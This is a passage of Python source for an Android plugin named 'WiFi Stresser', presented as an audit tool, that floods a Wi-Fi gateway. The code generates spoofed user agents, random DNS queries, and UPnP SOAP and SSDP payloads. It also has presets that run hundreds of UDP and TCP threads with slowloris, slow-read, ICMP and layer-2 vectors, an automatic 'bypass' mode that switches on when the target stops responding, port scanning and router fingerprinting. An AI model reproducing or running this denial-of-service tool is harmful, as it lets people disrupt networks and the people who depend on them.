def is_valid_ip(ip):
    if not ip or not isinstance(ip, str): return False
    ip = ip.strip()
    if not IP_REGEX.match(ip): return False
    for octet in ip.split("."):
        try:
            if not (0 <= int(octet) <= 255): return False
        except ValueError: return False
    return True

def generate_random_user_agent():
    android_models = ["SM-S928B", "SM-G998B", "Pixel 8 Pro", "Pixel 9", "23127PN0CG", "Redmi Note 13", "NX769J"]
    platforms = [
        ("Windows NT 10.0; Win64; x64", "chrome"), ("Windows NT 10.0; Win64; x64", "firefox"),
        ("Macintosh; Intel Mac OS X 10_15_7", "chrome"), ("Macintosh; Intel Mac OS X 10_15_7", "safari"),
        ("X11; Linux x86_64", "chrome"), ("X11; Linux x86_64", "firefox"),
        (f"Linux; Android {random.randint(11, 15)}; {random.choice(android_models)}", "mobile_chrome"),
        (f"iPhone; CPU iPhone OS {random.randint(16, 18)}_{random.randint(0, 5)} like Mac OS X", "mobile_safari")
    ]
    plat, browser = random.choice(platforms)
    chrome_ver = f"{random.randint(120, 138)}.0.{random.randint(1000, 6999)}.{random.randint(10, 199)}"
    firefox_ver = f"{random.randint(120, 136)}.0"
    safari_ver = f"{random.randint(16, 18)}.{random.randint(0, 5)}"
    if browser == "chrome": return f"Mozilla/5.0 ({plat}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"
    if browser == "firefox": return f"Mozilla/5.0 ({plat}; rv:{firefox_ver}) Gecko/20100101 Firefox/{firefox_ver}"
    if browser == "safari": return f"Mozilla/5.0 ({plat}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Safari/537.36"
    if browser == "mobile_chrome": return f"Mozilla/5.0 ({plat}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"
    if browser == "mobile_safari": return f"Mozilla/5.0 ({plat}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Mobile/15E148 Safari/604.1"
    return f"Mozilla/5.0 ({plat}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"

def build_random_dns_query():
    tx_id = os.urandom(2)
    flags = b"\x01\x00"
    qdcount = b"\x00\x01"
    ancount = b"\x00\x00"
    nscount = b"\x00\x00"
    arcount = b"\x00\x00"
    if random.random() < 0.4:
        domain = random.choice(REAL_DOMAINS)
        tld = random.choice(TLD_LIST)
        qname = bytes([len(domain)]) + domain + bytes([len(tld)]) + tld + b"\x00"
        qtype = random.choice([b"\x00\x01", b"\x00\x1c", b"\x00\x0f"])
    else:
        subdomain = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)).encode()
        tld = random.choice(TLD_LIST)
        qname = bytes([len(subdomain)]) + subdomain + bytes([len(tld)]) + tld + b"\x00"
        qtype = random.choice([b"\x00\x01", b"\x00\x1c", b"\x00\x0c", b"\x00\x0f", b"\x00\x10", b"\x00\xff"])
    qclass = b"\x00\x01"
    return tx_id + flags + qdcount + ancount + nscount + arcount + qname + qtype + qclass

def build_upnp_soap_payload(gateway_ip):
    soap_body = (
        '<?xml version="1.0"?>\r\n'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n'
        '<s:Body>\r\n'
        '<u:GetStatusInfo xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n'
        '</u:GetStatusInfo>\r\n'
        '</s:Body>\r\n'
        '</s:Envelope>\r\n'
    )
    req = (
        f"POST /ctl/IPConn HTTP/1.1\r\n"
        f"Host: {gateway_ip}:1900\r\n"
        f"User-Agent: {generate_random_user_agent()}\r\n"
        f'SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#GetStatusInfo"\r\n'
        f'Content-Type: text/xml; charset="utf-8"\r\n'
        f"Content-Length: {len(soap_body)}\r\n"
        f"Connection: close\r\n\r\n"
        f"{soap_body}"
    )
    return req.encode()

def build_ssdp_msearch(gateway_ip):
    st = random.choice([
        "ssdp:all", "upnp:rootdevice",
        "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
        "urn:schemas-upnp-org:service:WANIPConnection:1",
        "urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1"
    ])
    mx = random.randint(1, 5)
    req = (
        f"M-SEARCH * HTTP/1.1\r\n"
        f"Host: {gateway_ip}:1900\r\n"
        f'Man: "ssdp:discover"\r\n'
        f"ST: {st}\r\n"
        f"MX: {mx}\r\n"
        f"User-Agent: {generate_random_user_agent()}\r\n"
        f"Connection: close\r\n\r\n"
    )
    return req.encode()

class WiFiStresser(BasePlugin):
    def on_plugin_load(self):
        self.add_module(
            title="WiFi Stresser v4.0.4",
            description="L4/L7/L2/UPnP/SSDP/DNS/Bypass 5.0 audit",
            icon="wifi_off", screen="main", section="PLUGINS"
        )
        self.lang = self.get_setting("lang", "ru")
        if self.lang not in I18N: self.lang = "ru"
            
        self.high_limit_mode = bool(self.get_setting("high_limit_mode", False))
        self._register_settings()
        
        self.running = False
        self.stop_flag = False
        self.threads = []
        self.sockets = []
        self.sockets_lock = threading.Lock()
        self.stats_lock = threading.Lock()
        self._stress_lock = threading.Lock()
        self.stats = {"http": 0, "connect": 0, "hold": 0, "udp": 0,
                      "upnp": 0, "ssdp": 0, "dns": 0, "l2": 0,
                      "slowread": 0, "icmp": 0}
        self.pps = 0
        self.pps_history = []
        self.time_left = 0
        self._ping_key = "ping_idle"
        self._ping_args = {}
        self._vit_key = "vit_idle"
        self._vit_args = {}
        self.vitality_status = self.L("vit_idle")
        self._is_pinging = False
        self._is_scanning_ports = False
        self._is_fingerprinting = False
        self._priv_refreshing = False
        self._priv_checked_at = 0.0
        self._shizuku_service = False
        self._shizuku_perm = False
        self._last_l2_time = 0.0
        self.generated_report_text = ""
        self.scan_results = []
        self.logs = []
        self.logs_lock = threading.Lock()
        self.router_vendor = "__unknown__"
        self.router_fingerprinted = False
        self.session_history = self.get_setting("session_history", [])
        if isinstance(self.session_history, str):
            try: self.session_history = json.loads(self.session_history)
            except Exception: self.session_history = []
        self.gateway = self.get_setting("gateway", "192.168.1.1")
        self.port = int(self.get_setting("port", 80))
        self.udp_threads = int(self.get_setting("udp_threads", 256))
        self.tcp_threads = int(self.get_setting("tcp_threads", 32))
        self.duration = int(self.get_setting("duration", 60))
        self.method = self.get_setting("method", "UDP")
        self.active_preset = self.get_setting("active_preset", "Custom")
        self.throttle_ignore = bool(self.get_setting("throttle_ignore", False))
        self.bypass_mode = bool(self.get_setting("bypass_mode", False))
        self.mixed_udp = self.get_setting("mixed_udp", True)
        self.mixed_connect = self.get_setting("mixed_connect", True)
        self.mixed_http = self.get_setting("mixed_http", True)
        self.mixed_hold = self.get_setting("mixed_hold", True)
        self.mixed_slowloris = self.get_setting("mixed_slowloris", True)
        self.mixed_slowbody = self.get_setting("mixed_slowbody", True)
        self.mixed_slowread = self.get_setting("mixed_slowread", True)
        self.mixed_upnp = self.get_setting("mixed_upnp", True)
        self.mixed_ssdp = self.get_setting("mixed_ssdp", True)
        self.mixed_dns = self.get_setting("mixed_dns", True)
        self.mixed_l2 = self.get_setting("mixed_l2", True)
        self.mixed_icmp = self.get_setting("mixed_icmp", True)
        
        self._cached_root = False
        self._cached_shizuku = False
        threading.Thread(target=self._cache_privileges, daemon=True).start()
        self._init_auto_gateway()

    def _get_max_limits(self):
        if self.high_limit_mode: return 2048, 1024
        return 1024, 512

    def L(self, key, **fmt):
        d = I18N.get(self.lang, I18N["ru"])
        s = d.get(key) or I18N["ru"].get(key) or key
        if fmt:
            try: s = s.format(**fmt)
            except Exception: pass
        return s

    def _set_lang(self, lang):
        if lang == self.lang or lang not in I18N: return
        self.lang = lang
        self.set_setting("lang", lang)
        self._register_settings()
        self.vitality_status = self.L(self._vit_key, **self._vit_args)
        self.refresh()

    def _register_settings(self):
        max_udp, max_tcp = self._get_max_limits()
        self.api.registerSettings(
            "WiFi Stresser",
            json.dumps([
                {"type": "slider", "key": "udp_threads", "title": self.L("set_udp"),
                 "min": 16, "max": max_udp, "default": 256, "steps": max(1, max_udp - 16)},
                {"type": "slider", "key": "tcp_threads", "title": self.L("set_tcp"),
                 "min": 4, "max": max_tcp, "default": 32, "steps": max(1, max_tcp - 4)},
                {"type": "switch", "key": "throttle_ignore",
                 "title": self.L("set_thr"), "subtitle": self.L("set_thr_sub"), "default": False},
                {"type": "switch", "key": "high_limit_mode",
                 "title": self.L("sw_lim"), "subtitle": self.L("sw_lim_sub"), "default": False}
            ]), 10
        )

    def _ping_display(self): return self.L(self._ping_key, **self._ping_args)
    def _set_ping(self, key, **fmt):
        self._ping_key = key
        self._ping_args = fmt

    def _set_vitality(self, key, **fmt):
        self._vit_key = key
        self._vit_args = fmt
        self.vitality_status = self.L(key, **fmt)

    def _vit_display(self): return self.L(self._vit_key, **self._vit_args)

    def _vendor_display(self):
        v = self.router_vendor
        if v == "__unknown__": return self.L("vendor_unknown")
        if v == "__timeout__": return self.L("vendor_timeout")
        if isinstance(v, str) and v.startswith("__err__:"): return self.L("vendor_err", e=v.split(":", 2)[-1])
        return v

    def _parse_exec_result(self, res):
        if res is None: return False, ""
        if isinstance(res, dict):
            ok = bool(res.get("ok", False)) and int(res.get("code", -1)) == 0
            return ok, str(res.get("out", ""))
        text = str(res)
        try:
            parsed = json.loads(text)
            if isinstance(parsed, dict):
                ok = bool(parsed.get("ok", False)) and int(parsed.get("code", -1)) == 0
                return ok, str(parsed.get("out", ""))
        except Exception: pass
        return True, text

    def _cache_privileges(self):
        self._shizuku_service = False
        self._shizuku_perm = False
        root_ok = False
        try:
            ok, out = self._parse_exec_result(self.root("id"))
            low = out.strip().lower()
            if ok and "uid=0" in low: root_ok = True
        except Exception: pass
        self._cached_root = root_ok
        shizuku_ok = False
        try:
            device = self.api.getDevice()
            avail, perm = False, False
            try: avail = bool(device.shizukuAvailable())
            except Exception: pass
            try: perm = bool(device.shizukuHasPermission())
            except Exception: pass
            self._shizuku_service = avail
            self._shizuku_perm = perm
            if avail and perm: shizuku_ok = True
            elif avail:
                ok, out = self._parse_exec_result(self.shizuku("id"))
                low = out.strip().lower()
                if ok and ("uid=2000" in low or "uid=0" in low):
                    shizuku_ok = True
                    self._shizuku_perm = True
        except Exception: pass
        self._cached_shizuku = shizuku_ok
        self._priv_checked_at = time.time()

    def _refresh_privileges_async(self, silent=True):
        if self._priv_refreshing: return
        self._priv_refreshing = True
        prev_sh = self._cached_shizuku
        def work():
            try:
                self._cache_privileges()
                if not silent:
                    self.toast(self.L("t_priv", s="OK" if self._cached_shizuku else "X", r="OK" if self._cached_root else "X"))
                elif self._cached_shizuku and not prev_sh:
                    self.toast(self.L("t_shizuku_ok"))
            finally:
                self._priv_refreshing = False
                self.refresh()
        threading.Thread(target=work, daemon=True).start()

    def _request_shizuku_permission(self):
        try:
            device = self.api.getDevice()
            device.shizukuRequestPermission()
            self._log(self.L("l_shizuku_ask"), "INFO")
            self.toast(self.L("t_shizuku_ask"))
            threading.Timer(3.0, lambda: self._refresh_privileges_async(silent=True)).start()
        except Exception: self.toast(self.L("t_shizuku_fail"))

    @property
    def has_root(self): return self._cached_root
    @property
    def has_shizuku(self): return self._cached_shizuku

    def _log(self, text, level="INFO"):
        icons = {"INFO": "ℹ️", "WARN": "⚠️", "ERR": "❌", "OK": "✅", "HEALTH": "🩺",
                 "BYPASS": "⚡", "SCAN": "🔍", "FINGERPRINT": "🎯"}
        prefix = icons.get(level, "🔹")
        entry = f"[{time.strftime('%H:%M:%S')}] {prefix} {text}"
        with self.logs_lock:
            self.logs.append(entry)
            if len(self.logs) > 50: self.logs.pop(0)

    def _clear_logs(self):
        with self.logs_lock: self.logs.clear()
        self.refresh()

    def _record_error(self, method_name, error):
        err_str = str(error)
        err_type = type(error).__name__
        if "ECONNREFUSED" in err_str or "Connection refused" in err_str: detail = self.L("err_refused", m=method_name)
        elif "ETIMEDOUT" in err_str or "timed out" in err_str: detail = self.L("err_timeout", m=method_name)
        elif "ENETUNREACH" in err_str or "Network is unreachable" in err_str: detail = self.L("err_unreach", m=method_name)
        elif "EMFILE" in err_str or "Too many open files" in err_str: detail = self.L("err_emfile", m=method_name)
        elif "ENOBUFS" in err_str or "No buffer space" in err_str: detail = self.L("err_enobufs", m=method_name)
        elif "EPIPE" in err_str or "Broken pipe" in err_str: detail = self.L("err_epipe", m=method_name)
        else: detail = self.L("err_generic", m=method_name, t=err_type, e=err_str[:35])
        self._log(detail, "ERR")

    def _safe_close_socket(self, sock):
        if not sock: return
        try: sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        except Exception: pass
        try: sock.close()
        except Exception: pass

    def _fingerprint_router(self):
        if self._is_fingerprinting: return
        if not self.gateway or not is_valid_ip(self.gateway):
            self.toast(self.L("t_ip_bad"))
            return
        self._is_fingerprinting = True
        self._set_ping("fp_running")
        self.refresh()
        target = (self.gateway.strip(), self.port)
        vendor = "__unknown__"
        extra_info = ""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.5)
            sock.connect(target)
            req = (f"GET / HTTP/1.0\r\nHost: {self.gateway}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nConnection: close\r\n\r\n").encode()
            sock.send(req)
            resp = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk: break
                    resp += chunk
                    if len(resp) > 32768: break
                except Exception: break
            sock.close()
            resp_text = resp.decode('utf-8', errors='ignore')
            resp_lower = resp_text.lower()
            for v_name, signatures in VENDOR_SIGNATURES:
                for sig in signatures:
                    if sig.lower() in resp_lower:
                        vendor = v_name
                        break
                if vendor != "__unknown__": break
            server_match = re.search(r'server:\s*([^\r\n]+)', resp_text, re.IGNORECASE)
            if server_match: extra_info = server_match.group(1).strip()[:50]
            realm_match = re.search(r'realm="([^"]+)"', resp_text, re.IGNORECASE)
            if realm_match and vendor == "__unknown__": vendor = f"Custom ({realm_match.group(1)[:30]})"
        except socket.timeout: vendor = "__timeout__"
        except Exception as e: vendor = f"__err__:{type(e).__name__}"
        finally: self._is_fingerprinting = False
        self.router_vendor = vendor
        self.router_fingerprinted = True
        disp = self._vendor_display()
        self._log(self.L("l_fp", v=disp) + (f" · Server: {extra_info}" if extra_info else ""), "FINGERPRINT")
        self._set_ping("vendor_lbl", v=disp)
        self.toast(f"🎭 {disp}")
        self.refresh()
        return vendor

    def _ui_and_timer_loop(self):
        last_total = 0
        last_time = time.time()
        timer_accumulator = 0.0
        while self.running and not self.stop_flag:
            time.sleep(0.4)
            now = time.time()
            dt = now - last_time
            last_time = now
            with self.stats_lock: current_total = sum(self.stats.values())
            if dt > 0:
                self.pps = int((current_total - last_total) / dt)
                last_total = current_total
                self.pps_history.append(self.pps)
                if len(self.pps_history) > 30: self.pps_history.pop(0)
            if self.duration > 0:
                timer_accumulator += dt
                if timer_accumulator >= 1.0:
                    dec = int(timer_accumulator)
                    self.time_left = max(0, self.time_left - dec)
                    timer_accumulator -= dec
                    if self.time_left <= 0:
                        threading.Thread(target=self._stop_stress, daemon=True).start()
                        break
            self.refresh()

    def _vitality_monitor_loop(self):
        time.sleep(3.0)
        while self.running and not self.stop_flag:
            target_host = self.gateway.strip()
            target_port = self.port
            target_ok = 0
            dns_ok = 0
            latencies = []
            for _ in range(3):
                if self.stop_flag: break
                try:
                    t0 = time.time()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.8)
                    s.connect((target_host, target_port))
                    self._safe_close_socket(s)
                    latencies.append((time.time() - t0) * 1000)
                    target_ok += 1
                except Exception: pass
                time.sleep(0.15)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8)
                s.connect((target_host, 53))
                self._safe_close_socket(s)
                dns_ok += 1
            except Exception: pass
            if target_ok == 0 and dns_ok > 0:
                self._set_vitality("vit_protect")
                log_lvl = "HEALTH"
                if not self.bypass_mode:
                    self.bypass_mode = True
                    self.set_setting("bypass_mode", True)
                    self._log(self.L("l_bypass_auto"), "BYPASS")
            elif target_ok == 0 and dns_ok == 0:
                self._set_vitality("vit_dead")
                log_lvl = "ERR"
            else:
                avg_ms = round(sum(latencies) / len(latencies), 1) if latencies else 0.0
                loss = int(((3 - target_ok) / 3) * 100)
                if loss == 0 and avg_ms < 35:
                    self._set_vitality("vit_good", ms=avg_ms)
                    log_lvl = "OK"
                elif loss == 0 and avg_ms < 120:
                    self._set_vitality("vit_lag", ms=avg_ms)
                    log_lvl = "WARN"
                else:
                    self._set_vitality("vit_over", ms=avg_ms, loss=loss)
                    log_lvl = "WARN"
            self._log(self.L("l_vit", s=self._vit_display()), log_lvl)
            self.refresh()
            for _ in range(15):
                if not self.running or self.stop_flag: break
                time.sleep(1.0)

    def _run_port_scan(self):
        if self._is_scanning_ports: return
        if not self.gateway or not is_valid_ip(self.gateway):
            self.toast(self.L("t_ip_bad"))
            return
        self._is_scanning_ports = True
        self.scan_results = []
        self._log(self.L("l_scan", g=self.gateway), "SCAN")
        self.toast(self.L("scan_running"))
        self.refresh()
        threading.Thread(target=self._async_port_scan_worker, daemon=True).start()

    def _async_port_scan_worker(self):
        target_host = self.gateway.strip()
        open_ports = []
        for p, name in COMMON_AUDIT_PORTS:
            try:
                t0 = time.time()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.6)
                res = s.connect_ex((target_host, p))
                latency = (time.time() - t0) * 1000
                self._safe_close_socket(s)
                if res == 0: open_ports.append((p, name, round(latency, 1)))
            except Exception: pass
        self._is_scanning_ports = False
        self.scan_results = open_ports
        if open_ports:
            open_ports_sorted = sorted(open_ports, key=lambda x: x[2])
            best = open_ports_sorted[0]
            self._log(self.L("l_scan_ok", p=", ".join([f"{p} ({n}, {l}ms)" for p, n, l in open_ports])), "OK")
            self.port = best[0]
            self.set_setting("port", best[0])
            self.toast(self.L("scan_best", p=best[0], n=best[1], ms=best[2]))
        else:
            self._log(self.L("l_scan_none"), "WARN")
            self.toast(self.L("scan_none"))
        self.refresh()

    def _apply_preset(self, preset_name):
        self.active_preset = preset_name
        self.set_setting("active_preset", preset_name)
        if preset_name == "Standard":
            self.method = "HTTP"
            self.tcp_threads = 64
            self.bypass_mode = False
            self.port = 80
            self.toast(self.L("pre_standard"))
        elif preset_name == "Keenetic":
            self.method = "Mixed"
            self.udp_threads = 128
            self.tcp_threads = 24
            self.bypass_mode = True
            self.port = 53
            for k in ["mixed_udp", "mixed_connect", "mixed_http", "mixed_hold",
                      "mixed_slowloris", "mixed_slowbody", "mixed_slowread",
                      "mixed_upnp", "mixed_ssdp", "mixed_dns", "mixed_icmp"]:
                setattr(self, k, True)
            self.toast(self.L("pre_keenetic"))
        elif preset_name == "Radio":
            self.method = "L2 (Root)" if (self.has_root or self.has_shizuku) else "UDP"
            self.udp_threads = 512
            self.bypass_mode = True
            self.toast(self.L("pre_radio"))
        elif preset_name == "MaxStress":
            self.method = "Mixed"
            self.udp_threads = 512
            self.tcp_threads = 64
            self.bypass_mode = True
            for k in ["mixed_udp", "mixed_connect", "mixed_http", "mixed_hold",
                      "mixed_slowloris", "mixed_slowbody", "mixed_slowread",
                      "mixed_upnp", "mixed_ssdp", "mixed_dns", "mixed_icmp"]:
                setattr(self, k, True)
            self.toast(self.L("pre_max"))
        self.set_setting("method", self.method)
        self.set_setting("udp_threads", self.udp_threads)
        self.set_setting("tcp_threads", self.tcp_threads)
        self.set_setting("bypass_mode", self.bypass_mode)
        self.set_setting("port", self.port)
        self.refresh()

    def _save_session(self, peak_pps_override=None):
        with self.stats_lock: total_packets = sum(self.stats.values())
        peak = peak_pps_override if peak_pps_override is not None else (max(self.pps_history) if self.pps_history else self.pps)
        session = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "gateway": self.gateway, "port": self.port,
            "vendor": self._vendor_display(), "method": self.method,
            "preset": self.active_preset, "total_packets": total_packets,
            "peak_pps": peak, "vitality": self._vit_display()
        }
        self.session_history.insert(0, session)
        if len(self.session_history) > 10: self.session_history = self.session_history[:10]
        self.set_setting("session_history", json.dumps(self.session_history))

    def _export_audit_report(self):
        with self.stats_lock:
            total_packets = sum(self.stats.values())
            stats_copy = dict(self.stats)
        dur_text = f"{self.duration}s" if self.duration > 0 else "inf"
        report_lines = [
            "=== WI-FI AUDIT REPORT (WiFi Stresser v4.0.4) ===",
            f"Author: {__author__}", f"Target: {self.gateway}:{self.port}",
            f"Vendor: {self._vendor_display()}", f"Method: {self.method} (Preset: {self.active_preset})",
            f"Threads: UDP {self.udp_threads} / TCP {self.tcp_threads} | Duration: {dur_text}",
            f"Bypass: {'5.0 ON' if self.bypass_mode else 'OFF'}", f"Vitality: {self._vit_display()}",
            f"Total packets: {total_packets}", f"Peak PPS: ~{max(self.pps_history) if self.pps_history else self.pps}",
            "--- Vectors ---", f"UDP: {stats_copy.get('udp', 0)}", f"DNS: {stats_copy.get('dns', 0)}",
            f"SSDP: {stats_copy.get('ssdp', 0)}", f"UPnP: {stats_copy.get('upnp', 0)}",
            f"HTTP: {stats_copy.get('http', 0)}", f"CONNECT: {stats_copy.get('connect', 0)}",
            f"HOLD: {stats_copy.get('hold', 0)}", f"SLOWREAD: {stats_copy.get('slowread', 0)}",
            f"ICMP: {stats_copy.get('icmp', 0)}", f"L2: {stats_copy.get('l2', 0)}",
            "=================================================="
        ]
        self.generated_report_text = "\n".join(report_lines)
        
        export_dir = "/sdcard/Download"
        try:
            from com.chaquo.python import Python
            from android.os import Environment
            context = Python.getPlatform().getApplication()
            safe_dir = context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)
            if safe_dir:
                if not safe_dir.exists(): safe_dir.mkdirs()
                export_dir = safe_dir.getAbsolutePath()
        except Exception: pass

        try:
            timestamp_str = time.strftime("%Y%m%d_%H%M%S")
            export_data = {
                "version": "4.0.4", "gateway": self.gateway, "port": self.port,
                "vendor": self._vendor_display(), "method": self.method,
                "preset": self.active_preset, "bypass_mode": self.bypass_mode,
                "total_packets": total_packets,
                "peak_pps": max(self.pps_history) if self.pps_history else self.pps,
                "stats": stats_copy, "vitality": self._vit_display()
            }
            json_path = os.path.join(export_dir, f"wifi_audit_{timestamp_str}.json")
            with open(json_path, "w", encoding="utf-8") as f: json.dump(export_data, f, ensure_ascii=False, indent=4)
            csv_path = os.path.join(export_dir, f"wifi_audit_{timestamp_str}.csv")
            with open(csv_path, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["Metric", "Value"])
                for k, v in export_data.items():
                    if isinstance(v, dict):
                        for sub_k, sub_v in v.items(): writer.writerow([f"{k}_{sub_k}", sub_v])
                    else: writer.writerow([k, v])
            self._log(self.L("l_export_ok"), "OK")
        except Exception as e: self._log(self.L("l_export_fail", e=e), "ERR")
            
        copied = False
        try:
            from com.chaquo.python import Python
            from android.content import Context, ClipData
            app_context = Python.getPlatform().getApplication()
            clipboard = app_context.getSystemService(Context.CLIPBOARD_SERVICE)
            clipboard.setPrimaryClip(ClipData.newPlainText("WiFi Stresser Report", self.generated_report_text))
            copied = True
        except Exception: pass
        if not copied:
            for attr in ["setClipboard", "copyToClipboard", "setClipboardText", "copy"]:
                if hasattr(self.api, attr):
                    try:
                        getattr(self.api, attr)(self.generated_report_text)
                        copied = True
                        break
                    except Exception: pass
        self._save_session()
        self._log(self.L("l_report"), "OK")
        self.toast(self.L("t_export_ok") if copied else self.L("t_export_plain"))
        self.navigate("report")

    def _open_rickroll(self):
        url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        for m in ["openUrl", "open_url", "openBrowser"]:
            if hasattr(self.api, m):
                try:
                    getattr(self.api, m)(url)
                    return
                except Exception: pass
        try:
            from com.chaquo.python import Python
            from android.content import Intent
            from android.net import Uri
            activity = Python.getPlatform().getApplication()
            intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            activity.startActivity(intent)
        except Exception: pass

    def _get_wifi_info(self):
        ssid = None
        ip = None
        is_wifi = False
        try:
            device_info = self.api.getDevice()
            if device_info:
                data = json.loads(device_info) if isinstance(device_info, str) else device_info
                wifi = data.get("wifi", {}) or data.get("network", {}).get("wifi", {})
                raw_ssid = wifi.get("ssid") or wifi.get("name") or wifi.get("SSID")
                raw_ip = wifi.get("ip") or wifi.get("IP") or wifi.get("address")
                if raw_ssid and str(raw_ssid).strip() not in ["<unknown ssid>", "0x", "", "null", "None"]:
                    ssid = str(raw_ssid).strip()
                    is_wifi = True
                if raw_ip and str(raw_ip).strip() not in ["", "null", "None"]:
                    ip = str(raw_ip).strip()
        except Exception: pass
        if not ip or ip in ["—", "127.0.0.1"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.4)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                self._safe_close_socket(s)
            except Exception: ip = None
        if ip:
            if ip.startswith("198.18."):
                ssid = "VPN Fake-IP"
                is_wifi = False
            elif ip.startswith("192.168."):
                is_wifi = True
                ssid = ssid or "Wi-Fi (LAN)"
            elif ip.startswith("100.") or (ip.startswith("10.") and not is_wifi):
                ssid = ssid or "Mobile / VPN"
            else:
                ssid = ssid or "Wi-Fi/LAN"
                is_wifi = True
        else: ssid = "Wi-Fi: —"
        return ssid, ip or "—", is_wifi

    def _init_auto_gateway(self):
        _, ip, is_wifi = self._get_wifi_info()
        if is_wifi and ip and ip != "—" and "." in ip:
            octets = ip.split(".")
            if len(octets) == 4:
                octets[-1] = "1"
                candidate = ".".join(octets)
                if is_valid_ip(candidate):
                    self.gateway = candidate
                    self.set_setting("gateway", self.gateway)
        else:
            if not self.gateway or self.gateway.startswith("198.18."):
                self.gateway = "192.168.1.1"

    def _auto_detect_gateway(self):
        _, ip, _ = self._get_wifi_info()
        if ip and ip != "—" and "." in ip:
            if ip.startswith("198.18."):
                self.toast(self.L("t_vpn"))
                return
            octets = ip.split(".")
            if len(octets) == 4:
                octets[-1] = "1"
                candidate = ".".join(octets)
                if is_valid_ip(candidate):
                    self.gateway = candidate
                    self.set_setting("gateway", self.gateway)
                    self.toast(self.L("t_autoip_ok", g=self.gateway))
                    self.refresh()
                    return
        self.toast(self.L("t_autoip_fail"))

    def _test_gateway_reachability(self):
        if self._is_pinging: return
        if not self.gateway or not is_valid_ip(self.gateway):
            self.toast(self.L("t_ip_bad"))
            return
        self._is_pinging = True
        self._set_ping("ping_checking")
        self.refresh()
        threading.Thread(target=self._async_ping_worker, daemon=True).start()

    def _async_ping_worker(self):
        target_host = self.gateway.strip()
        target_port = self.port
        sock = None
        sock2 = None
        self._log(self.L("l_ping", h=target_host, p=target_port), "INFO")
        try:
            t0 = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.2)
            sock.connect((target_host, target_port))
            ms = round((time.time() - t0) * 1000, 1)
            self._set_ping("ping_ok", ms=ms, p=target_port)
            self._log(self.L("ping_ok", ms=ms, p=target_port), "OK")
        except Exception as e:
            try:
                t0 = time.time()
                sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock2.settimeout(1.0)
                sock2.connect((target_host, 53))
                ms = round((time.time() - t0) * 1000, 1)
                self._set_ping("ping_closed", ms=ms, p=target_port)
                self._log(self.L("l_ping_closed", p=target_port, e=type(e).__name__), "WARN")
            except Exception as e2:
                self._set_ping("ping_fail", h=target_host)
                self._log(self.L("l_ping_fail", h=target_host, e=e2), "ERR")
        finally:
            self._safe_close_socket(sock)
            self._safe_close_socket(sock2)
            self._is_pinging = False
            self.refresh()

    def _get_mixed_tcp_methods(self):
        methods = []
        if self.mixed_connect: methods.append(self._connect_once)
        if self.mixed_http: methods.append(self._http_once)
        if self.mixed_hold: methods.append(self._hold_once)
        if self.mixed_slowloris: methods.append(self._slowloris_once)
        if self.mixed_slowbody: methods.append(self._slowbody_once)
        if self.mixed_slowread: methods.append(self._slowread_once)
        return methods

    def _get_mixed_udp_methods(self):
        methods = []
        if self.mixed_udp: methods.append(self._udp_once)
        if self.mixed_upnp: methods.append(self._upnp_once)
        if self.mixed_ssdp: methods.append(self._ssdp_once)
        if self.mixed_dns: methods.append(self._dns_once)
        if self.mixed_icmp and (self.has_root or self.has_shizuku): methods.append(self._icmp_once)
        if self.mixed_l2 and (self.has_root or self.has_shizuku): methods.append(self._l2_once)
        return methods

    def on_setting_changed(self, payload):
        key = payload.get("key")
        value = payload.get("value")
        if key == "udp_threads":
            self.udp_threads = int(value)
            self.set_setting("udp_threads", self.udp_threads)
        elif key == "tcp_threads":
            self.tcp_threads = int(value)
            self.set_setting("tcp_threads", self.tcp_threads)
        elif key == "throttle_ignore":
            self.throttle_ignore = bool(value)
            self.set_setting("throttle_ignore", self.throttle_ignore)
        elif key == "high_limit_mode":
            self.high_limit_mode = bool(value)
            self.set_setting("high_limit_mode", self.high_limit_mode)
        self.refresh()

    def screen_main(self, ui, api, state):
        if not self._priv_refreshing and (time.time() - self._priv_checked_at > 30):
            self._refresh_privileges_async(silent=True)
        ssid, ip, is_wifi = self._get_wifi_info()
        is_shizuku = self.has_shizuku
        is_root = self.has_root
        l2_available = is_root or is_shizuku
        icmp_available = l2_available
        log_content = "\n".join(self.logs[-7:]) if self.logs else self.L("log_empty")
        diag_buttons = [
            ui.button(self.L("btn_autoip"), on_click=self._auto_detect_gateway, style="outlined"),
            ui.button(self.L("btn_ping"), on_click=self._test_gateway_reachability, style="outlined"),
            ui.button(self.L("btn_ports"), on_click=self._run_port_scan, style="outlined"),
        ]
        priv_row = [
            ui.button(self.L("btn_fp"), on_click=lambda: self._fingerprint_router(), style="outlined"),
